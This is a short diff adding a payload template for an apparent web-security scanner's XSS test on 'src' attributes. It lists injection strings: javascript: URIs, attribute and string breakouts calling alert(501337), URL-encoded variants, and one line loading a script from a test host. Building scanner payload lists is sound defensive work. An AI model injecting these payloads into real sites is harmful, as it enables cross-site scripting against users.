@@ -1,0 +1,11 @@
+;template file for XssTestAttributeOnSrc payload
+;comments start with semicolon
+;payloads should be added line by line
+javascript:alert(501337);
+"><frame name=frame3 id=frame3 src="javascript:alert(501337);
+david"; alert(501337);//
+1; alert(501337);
+aa%22%20%26%20alert(501337)%20%26%20%22aa
+"aa%22%20%26%20alert(501337)%20%26%20%22aa"
+david'; alert(501337);//
+value alert(501337) src=http://ch1d.WebSec.binginternal.com/changedoctitle.js
